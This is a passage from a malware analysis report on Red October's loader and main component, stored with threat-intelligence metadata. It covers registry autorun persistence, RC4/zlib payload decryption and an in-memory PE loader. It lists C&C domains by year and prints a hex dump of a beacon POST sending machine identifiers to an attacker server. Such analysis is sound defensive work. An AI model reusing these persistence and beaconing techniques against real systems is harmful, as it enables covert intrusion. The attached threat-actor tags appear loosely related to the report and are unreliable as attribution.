07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.03 12:50:46\n(GMT)\n\n\n-----\n\n(GMT) (GMT)\n\n\n**0C4D3483AD48A4751E288993388E03D2** 2011.03.14 14:49:50\n(GMT)\n\n**9BD07F7DC5E26F022FDEA386D35EAC68** 2011.03.09 07:46:51\n(GMT)\n\n**1754024F9932DC25691CDB90D8FAC632** 2011.04.13 05:34:30\n(GMT)\n\n**4168EEF52CD458B253EBE62B8DAF75AC** 2011.03.14 13:34:01\n(GMT)\n\n**2B62D48C9D728C5D9650B39E0119F1B7** 2010.11.12 09:29:19\n(GMT)\n\n**EA74E951111ED2E046B87C0A9241FC25** 2012.08.02 05:59:07\n(GMT)\n\n**3BE885097DBD3DF03B568D1E248A2E4C** 2012.09.13 09:41:13\n(GMT)\n\n**B952997DD0AB0B58F916AF89A5C3E4BD** 2011.04.29 10:02:22\n(GMT)\n\n**2216490B1C09BB9B4E07AD05A1552FE9** 2012.04.06 11:35:36\n(GMT)\n\n**DBE4C33F6C482D571305589207A3F910** 2011.03.14 14:57:27\n(GMT)\n\n**8E88185368C9C2C53014E0BAEFCE3066** 2011.03.09 08:05:16\n(GMT)\n\n## Loader module\n\nKnown file locations:\n\n%PROGRAMFILES%\\Windows NT\\svchost.exe\n%PROGRAMFILES%\\Windows NT\\svclogon.exe\n\n\n2011.03.03 12:50:46\n(GMT)\n\n2011.03.03 12:50:46\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.03 12:50:46\n(GMT)\n\n2010.10.11 14:14:34\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.03 12:50:46\n(GMT)\n\n2011.03.03 12:50:46\n(GMT)\n\n\nThe module is a PE EXE file, compiled with Microsoft Visual Studio 2005.\n\nThis module is created by the first-stage dropper of the malware, usually from a file\ncontaining an exploit.\n\nIt creates a system event object using name patterns:\n\n**“WIN_%08X%08X%08X%08X%08X“, where “%08X“ parameters are replaced by the**\nhexadecimal value of the file body checksum (SHA1).\n**“SYS_%08X%08X%08X%08X%08X“, where “%08X“ parameters are replaced by the**\nhexadecimal value of the file name checksum (SHA1).\n\nThen, the module checks if it was granted administrative rights and sets corresponding\nflag, which is used in several subroutines.\n\n\n-----\n\ndirectory path and the volume serial number of the system drive.\n\nThen, it tries to read the default value of the following registry key:\n\nHKLM\\Software\\Classes\\CLSID\\generated_CLSID (if it has administrative rights)\nHKCU\\Software\\Classes\\CLSID\\generated_CLSID (if it has no administrative rights)\n\nIt checks the contents of the default key value. This check succeeds if the registry key is\nnot present or its value is equal to the last DWORD of the file’s SHA1 checksum. Otherwise\nthe check fails and it runs the check again each 3 milliseconds for 4294967294 times.\n\nThen, it sets the default value of the registry key to the hexadecimal representation of the\nvalue of the last SHA1’s DWORD and tries to read the registry value “InfoTip” from the same\nregistry key. The registry value is assumed to be a 48-byte binary buffer. It reads the time\nvalue from that buffer and exits if the difference between the recorded time and current\ntime is less than 3 days.\n\nThis means that the updated modules can be delivered not sooner than in three days to the\nsame victim. If someone tries to reinfect the system with the same dropper, it refuses to do\nso within 3 days from last infection. This can also be a mechanism to escape from\nattention of power users or administrators who can run recently opened suspicious\napplication again and monitor its activity.\n\nThen, it starts a registry installation thread and proceeds to its main loop.\n\n### Registry installation thread\n\nEvery 100 seconds the module ensures that it has been registered for autorun using one of\nthe registry keys:\n\nIf launched as administrator, it appends path to its own filename to:\n\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\n\nElse, it writes a registry value in:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\%autorun key% =”path to itself”\n\nPossible Autorun key values that we have observed:\n\n\n**Name of the encrypted main**\n**module**\n\n\n**Name of the “Run” registry**\n**value**\n\n\n**fsmgmtio32.msc** DotNet32\n\n**cfsyn.pcs** SdbChk\n\n**frpdhry.hry** Hre32\n\n**ime64ex.ncs** SrvCC32\n\n**io32.ocx** Ocx32\n\n\n-----\n\n**ocxstate.dat** NtNdsc\n\n**opdocx.gxt** Scpsts\n\n**sccme.hrp** Lhrp\n\n**scprd.hrd** Srsf\n\n**syncls.gxk** Mslisht\n\n**lgdrke.swk** Sltrdbe\n\n**sdlvk.acx** Ltsmde\n\n**wsdktr.ltp** Lsrtmpx\n\n**synhfr.pkc** Msdcc\n\n**scpkrp.gmx** Dbxchek\n\n**rfkscp.pck** Cskcmp\n\n**qsdtlp.rcp** Klsmod\n\n### Main loop\n\nThe module runs a loop with random Sleep() delays, and checks if it can fetch one of the\nURLs at microsoft.com.\n\n\n**Name of the encrypted main**\n**module**\n\n\n**Hostnames**\n\n\n**fsmgmtio32.msc** update.microsoft.com, www.microsoft.com\n\n**Other** update.microsoft.com, www.microsoft.com,\nsupport.microsoft.com\n\nIf any of the URLs are available, it starts the loader thread with a filename of the main\nmodule as a parameter. Then, it updates the “InfoTip” registry key with current time value\nand SHA1 of its filename. It also stores own Process ID in that value.\n\nThe module reads the proxy server settings of Internet Explorer, Firefox, Opera and tries to\nfetch URLs via proxies when direct connection is not available.\n\n\n-----\n\n### Loader Thread\n\nThe module reads the file that contains the main module, decrypts it using RC4 with a hardcoded key, and then decompresses it using the Zlib library. Then, it checks that the\ndecompressed buffer contains a PE file and starts the PE loader thread.\n\n### PE loader Thread\n\nThe module implements its own PE loader. The file that is loaded is expected to be a DLL.\nAfter loading and relocating the PE, the module calls its DllMain function twice\n(DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH) and returns.\n\n## Main component\n\n\n-----\n\n### DllMain function\n\nThe module sets a timer with a callback function to be executed every 900 seconds and\nstarts a Windows message loop.\n\n### Timer callback function\n\nThe module checks if the computer is connected to the Internet (using\nInternetGetConnectedState API) and if it is connected, starts its main thread.\n\n_HTTP Traffic generated by the main component._\n\n### Main thread\n\nThe module prepares a 98-byte buffer that contains several unique machine identifiers\nusing its system drive’s serial number, network adapters’ MAC addresses and Internet\nExplorer registration ID. The buffer also contains a unique hard-coded hexadecimal string\nthat appears to be a victim or campaign ID and a hard-coded DWORD value.\n\n\n-----\n\nThen, it sends this buffer to a first available C&C server from a hardcoded list using HTTP\nPOST requests. The module expects to receive an encrypted response packet from the\nserver. It decrypts the packet with a simple XOR algorithm, and executes one of the\nfollowing commands depending on the data contained in the packet:\n\nLoad the Dll from the packet in memory and execute its DllMain\nWrite the packet to a file in temporary/windows/system directory and execute it\nusing CreateProcess()\nLoad a Dll by specified local path and call its DllMain, or execute a program given its\npath\nWrite the packet to a file in temporary/windows/system directory\nWrite the contents of the packet to %TEMP%\\bestcrypt_update.exe and (optional\npart) %TEMP%\\bestcrypt_update.dll and execute the EXE file\n\n#### C&C server usage timeline\n\n**Year** **C&C domain names** **URL**\n\n**2007** msgenuine.net /cgi-bin/view\n\n**2008** msinfoonline.org /cgi-bin/a/slice\n\n**2009** microsoftosupdate.com;microsoft-msdn.com;microsoftcheck.com /cgi-bin/ms/check\n\nosgenuine.com;wingenuine.com;update-genuine.com /cgi-bin/gen/jau\n\n**2010** drivers-update-online.com;drivers-get.com;drivers-check.com /cgi-bin/driver/info\n\n\n-----\n\nmsonlineupdate.com;msonlinecheck.com;msonlineget.com /cgi-bin/online/set\n\n\nos-microsoft-check.com;os-microsoft-update.com;os-microsoftonline.com\n\nwindowscheckupdate.com;windowsgenuine.com;windowsonlineupdate.com\n\n\n/cgibin/microsoft/dev\n\n/cgi-bin/win/wcx\n\n\n**2011** dll-host-update.com;dll-host-check.com;dll-host.com /cgi-bin/dllhost/ac\n\ngenuine-check.com;genuineservicecheck.com;genuineupdate.com /cgi-bin/genuine/a\n\nmicrosoftosupdate.com;microsoft-msdn.com;microsoftcheck.com /cgi-bin/ms/check\n\n\nms-software-check.com;ms-software-update.com;ms-softwaregenuine.com\n\n\n/cgibin/software/tau\n\n\nnt-windows-online.com;nt-windows-update.com;nt-windows-check.com /cgi-bin/nt/th\n\nsvchost-check.com;svchost-online.com;svchost-update.com /cgi-bin/svchost/uat\n\n**2012** csrss-check-new.com;csrss-update-new.com;csrss-upgrade-new.com /cgi-bin/csrss/dfl\n\n\nms-software-check.com;ms-software-update.com;ms-softwaregenuine.com\n\n\n/cgibin/software/tau\n\n\nnt-windows-online.com;nt-windows-update.com;nt-windows-check.com /cgi-bin/nt/th\n\nsvchost-check.com;svchost-online.com;svchost-update.com /cgi-bin/svchost/uat\n\nwins-driver-check.com;wins-driver-update.com;win-driver-upgrade.com /cgi-bin/ntdriver/ton\n\n#### Main component file names\n\n**Year** **File name of the main component**\n\n**2007** netads.dat\n\n**2008** smartiosys.dbn\n\n**2009** smartiosys.dbn\n\n**2010** fsmgmtio32.msc\n\nime64ex.ncs\n\nocxwinsmb.tlb\n\n**2011** frpdhry.hry\n\nime64ex.ncs\n\nio32.ocx\n\nlhafd.gcp\n\nlsc32i.cmp\n\nocxstate.dat\n\nsccme.hrp\n\n\n-----\n\nlgdrke.swk\n\nlsmpdr.vcs\n\nmbdsec.sdx\n\nocxstate.dat\n\nopdocx.gxt\n\nqsdtlp.rcp\n\nrfkscp.pck\n\nscpesc.ecs\n\nscpkrp.gmx\n\nsdlvk.acx\n\nsyncls.gxk\n\nsynhfr.pkc\n\nwsdktr.ltp\n\n#### Example of C&C communication session\n\n(two bytes of the User ID were removed)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n00000000 50 4f 53 54 20 68 74 74 70 3a 2f 2f 6e 74 2d 77 |POST http://nt-w|\n00000010 69 6e 64 6f 77 73 2d 6f 6e 6c 69 6e 65 2e 63 6f |indows-online.co|\n00000020 6d 2f 63 67 69 2d 62 69 6e 2f 6e 74 2f 74 68 20 |m/cgi-bin/nt/th |\n00000030 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 |HTTP/1.1..Host: |\n00000040 6e 74 2d 77 69 6e 64 6f 77 73 2d 6f 6e 6c 69 6e |nt-windows-onlin|\n00000050 65 2e 63 6f 6d 0d 0a 43 6f 6e 6e 65 63 74 69 6f |e.com..Connectio|\n00000060 6e 3a 20 63 6c 6f 73 65 0d 0a 43 6f 6e 74 65 6e |n: close..Conten|\n00000070 74 2d 4c 65 6e 67 74 68 3a 20 39 38 0d 0a 0d 0a |t-Length: 98....|\n00000080 04 00 00 00 2e 36 3c 48 00 00 00 00 00 00 00 00 |.....6<H........|\n00000090 ---- ---- 33 35 42 34 30 43 42 33 42 39 46 35 33 31 |----35B40CB3B9F531|\n000000a0 35 35 35 36 f9 41 53 13 00 00 00 00 00 00 00 00 |5556.AS.........|\n000000b0 00 00 ff cf eb 5c 00 6f e8 ca 04 de 13 8d 25 e2 |.....\\.o......%.|\n000000c0 6f 5d f5 56 27 c0 00 00 00 00 00 00 00 00 00 00 |o].V'...........|\n000000d0 00 00 00 00 00 00 00 00 00 00 ca b8 3b 6f 00 00 |............;o..|\n000000e0 00 00                       |..|\n000000e2\n00000000 48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d |HTTP/1.1 200 OK.|\n00000010 0a 44 61 74 65 3a 20 54 68 75 2c 20 30 38 20 4e |.Date: Thu, 08 N|\n00000020 6f 76 20 32 30 31 32 20 31 31 3a 32 31 3a 30 30 |ov 2012 11:21:00|\n00000030 20 47 4d 54 0d 0a 53 65 72 76 65 72 3a 20 41 70 | GMT..Server: Ap|\n00000040 61 63 68 65 0d 0a 43 6f 6e 74 65 6e 74 2d 6c 65 |ache..Content-le|\n00000050 6e 67 74 68 3a 20 30 0d 0a 43 6f 6e 6e 65 63 74 |ngth: 0..Connect|\n00000060 69 6f 6e 3a 20 63 6c 6f 73 65 0d 0a 43 6f 6e 74 |ion: close..Cont|\n00000070 65 6e 74 2d 54 79 70 65 3a 20 74 65 78 74 2f 68 |ent-Type: text/h|\n00000080 74 6d 6c 0d 0a 0d 0a               |tml....|\n00000087\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2013/2013.01.14.Red_October_Campaign/securelist.com-Red%20October%20Detailed%20Malware%20Description%201%20First%20Stage%20of%20Attack.pdf"
    ],
    "report_names": [
        "securelist.com-Red October Detailed Malware Description 1 First Stage of Attack"
    ],
    "threat_actors": [
        {
            "id": "4b076dcb-516e-42fb-9c8f-f153902cd5e9",
            "created_at": "2022-10-25T16:07:23.708745Z",
            "updated_at": "2025-03-27T02:02:09.935617Z",
            "deleted_at": null,
            "main_name": "Hidden Lynx",
            "aliases": [
                "Aurora Panda",
                "Group 8",
                "Hidden Lynx",
                "Operation SMN"
            ],
            "source_name": "ETDA:Hidden Lynx",
            "tools": [
                "AGENT.ABQMR",
                "AGENT.AQUP.DROPPER",
                "AGENT.BMZA",
                "AGENT.GUNZ",
                "BlackCoffee",
                "HiKit",
                "MCRAT.A",
                "Mdmbot.E",
                "Moudoor",
                "Naid",
                "PNGRAT",
                "Trojan.Naid",
                "ZoxPNG",
                "gresim"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "761d1fb2-60e3-46f0-9f1c-c8a9715967d4",
            "created_at": "2023-01-06T13:46:38.269054Z",
            "updated_at": "2025-03-27T02:00:02.789278Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "TG-0110",
                "Group 6",
                "Buckeye",
                "Boyusec",
                "BORON",
                "BRONZE MAYFAIR",
                "Red Sylvan",
                "GOTHIC PANDA"
            ],
            "source_name": "MISPGALAXY:APT3",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cf7fc640-acfe-41c4-9f3d-5515d53a3ffb",
            "created_at": "2023-01-06T13:46:38.228042Z",
            "updated_at": "2025-03-27T02:00:02.775905Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "GIF89a",
                "G0006",
                "PLA Unit 61398",
                "Group 3",
                "TG-8223",
                "Comment Group",
                "ShadyRAT",
                "COMMENT PANDA",
                "Comment Crew",
                "Byzantine Candor",
                "Brown Fox"
            ],
            "source_name": "MISPGALAXY:APT1",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a7aefdda-98f1-4790-a32d-14cc99de2d60",
            "created_at": "2023-01-06T13:46:38.281844Z",
            "updated_at": "2025-03-27T02:00:02.792526Z",
            "deleted_at": null,
            "main_name": "APT17",
            "aliases": [
                "G0025",
                "AURORA PANDA",
                "Group 72",
                "G0001",
                "HELIUM",
                "Group 8",
                "Hidden Lynx",
                "Tailgater Team",
                "BRONZE KEYSTONE"
            ],
            "source_name": "MISPGALAXY:APT17",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "06f622cb-3a78-49cf-9a4c-a6007a69325f",
            "created_at": "2022-10-25T16:07:23.315239Z",
            "updated_at": "2025-03-27T02:02:09.733197Z",
            "deleted_at": null,
            "main_name": "APT 3",
            "aliases": [
                "APT 3",
                "Bronze Mayfair",
                "Buckeye",
                "Gothic Panda",
                "Group 6",
                "Operation Clandestine Fox",
                "Operation Clandestine Fox, Part Deux",
                "Operation Clandestine Wolf",
                "Operation Double Tap",
                "Red Sylvan",
                "TG-0110",
                "UPS Team"
            ],
            "source_name": "ETDA:APT 3",
            "tools": [
                "APT3 Keylogger",
                "Agent.dhwf",
                "BKDR_HUPIGON",
                "Backdoor.APT.CookieCutter",
                "Badey",
                "Bemstour",
                "CookieCutter",
                "Destroy RAT",
                "DestroyRAT",
                "DoublePulsar",
                "EXL",
                "EternalBlue",
                "HTran",
                "HUC Packet Transmit Tool",
                "Hupigon",
                "Hupigon RAT",
                "Kaba",
                "Korplug",
                "LaZagne",
                "MFC Huner",
                "OSInfo",
                "Pirpi",
                "PlugX",
                "RedDelta",
                "RemoteCMD",
                "SHOTPUT",
                "Sogu",
                "TIGERPLUG",
                "TTCalc",
                "TVT",
                "Thoper",
                "Xamtrav",
                "remotecmd",
                "shareip",
                "w32times"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3aaf0755-5c9b-4612-9f0e-e266ef1bdb4b",
            "created_at": "2022-10-25T16:07:23.480196Z",
            "updated_at": "2025-03-27T02:02:09.826059Z",
            "deleted_at": null,
            "main_name": "Comment Crew",
            "aliases": [
                "APT 1",
                "BrownFox",
                "Byzantine Candor",
                "Byzantine Hades",
                "Comment Crew",
                "Comment Panda",
                "GIF89a",
                "Group 3",
                "Operation Oceansalt",
                "Operation Seasalt",
                "Operation Siesta",
                "Shanghai Group",
                "TG-8223"
            ],
            "source_name": "ETDA:Comment Crew",
            "tools": [
                "Auriga",
                "Cachedump",
                "Chymine",
                "CookieBag",
                "Darkmoon",
                "GDOCUPLOAD",
                "GLOOXMAIL",
                "GREENCAT",
                "Gen:Trojan.Heur.PT",
                "GetMail",
                "Hackfase",
                "Hacksfase",
                "Helauto",
                "Kurton",
                "LETSGO",
                "LIGHTBOLT",
                "LIGHTDART",
                "LOLBAS",
                "LOLBins",
                "LONGRUN",
                "Living off the Land",
                "Lslsass",
                "MAPIget",
                "ManItsMe",
                "Mimikatz",
                "MiniASP",
                "Oceansalt",
                "Pass-The-Hash Toolkit",
                "Poison Ivy",
                "ProcDump",
                "Riodrv",
                "SPIVY",
                "Seasalt",
                "ShadyRAT",
                "StarsyPound",
                "TROJAN.COOKIES",
                "TROJAN.FOXY",
                "TabMsgSQL",
                "Tarsip",
                "Trojan.GTALK",
                "WebC2",
                "WebC2-AdSpace",
                "WebC2-Ausov",
                "WebC2-Bolid",
                "WebC2-Cson",
                "WebC2-DIV",
                "WebC2-GreenCat",
                "WebC2-Head",
                "WebC2-Kt3",
                "WebC2-Qbp",
                "WebC2-Rave",
                "WebC2-Table",
                "WebC2-UGX",
                "WebC2-Yahoo",
                "Wordpress Bruteforcer",
                "bangat",
                "gsecdump",
                "pivy",
                "poisonivy",
                "pwdump",
                "zxdosml"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041165,
    "ts_creation_date": 1545363041,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/89cfdc989240721e191029bc3636aabaddaa84b8.pdf",
        "text": "https://archive.orkl.eu/89cfdc989240721e191029bc3636aabaddaa84b8.txt",
        "img": "https://archive.orkl.eu/89cfdc989240721e191029bc3636aabaddaa84b8.jpg"
    }
}